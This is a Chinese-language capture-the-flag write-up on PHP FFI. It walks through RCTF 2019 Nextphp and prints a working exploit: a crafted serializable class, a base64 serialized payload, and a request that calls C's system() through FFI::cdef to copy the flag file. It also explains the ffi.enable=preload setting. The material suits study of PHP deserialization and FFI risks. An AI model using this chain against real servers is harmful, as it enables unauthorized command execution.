# 利用PHP FFI 预加载执行命令

## FFI

PHP7.4引入了一个扩展:PHP FFI(Foreign Function interface), 引用一段PHP FFI RFC中的一段描述:
>For PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP. 

是的，FFI提供了高级语言直接的互相调用，而对于PHP来说，FFI让我们可以方便的调用C语言写的各种库。

举个例子，如果想要调用C语言中的system函数，可以使用如下代码：
```php
<?php
$ffi=FFI::cdef("int system(char *command);");
$ffi->system("whoami");
?>
```

## 举例

以[RCTF 2019]Nextphp为例，题目的代码非常简单：

```php
<?php
if (isset($_GET['a'])) {
    eval($_GET['a']);
} else {
    show_source(__FILE__);
}
```

相同目录下有```preload.php```，源码如下：
```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'print_r',
        'arg' => '1'
    ];

    //可以进行函数执行
    private function run () {
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }

    public function __serialize(): array {
        return $this->data;
    }

    public function __unserialize(array $data) {
        //array_merge把两个数组合并为一个数组
        array_merge($this->data, $data);
        $this->run();
    }

    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        
        $this->data = unserialize($payload);
        $this->run();
    }
	//结果输出
    public function __get ($key) {
        //如果$key为ret，就可以输出函数执行返回的结果
        return $this->data[$key];
    }

    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

    public function __construct () {
        throw new \Exception('No implemented');
    }
}

```

分析可得上述代码在反序列化的时候会触发```run()```方法，反序列化后可以调用``` __serialize()```方法利用C语言中的```system()```方法完成RCE。

EXP如下：
```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => 'int system(char *command);'
    ];

    private function run () {
        echo "run<br>";
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }
    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }

    public function __get ($key) {
        return $this->data[$key];
    }

    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

    public function __construct () {
        echo "__construct<br>";
    }
}

$a = new A();
echo base64_encode(serialize($a)); 
```

然后访问payload就是```?a=unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319"))->__serialize()['ret']->system('cp /flag /var/www/html');```

上述payload可以将flag移到web目录。

## 总结

为什么不能用一开始的代码进行RCE？因为默认 ffi.enable=preload **且仅在命令行模式和**preload 文件中可用，在本地环境 ffi.enable=preload 模式下，web端也是无法执行 FFI 。将 ffi.enable 设置成 true 后，发现 web 端就可以利用 FFI 了。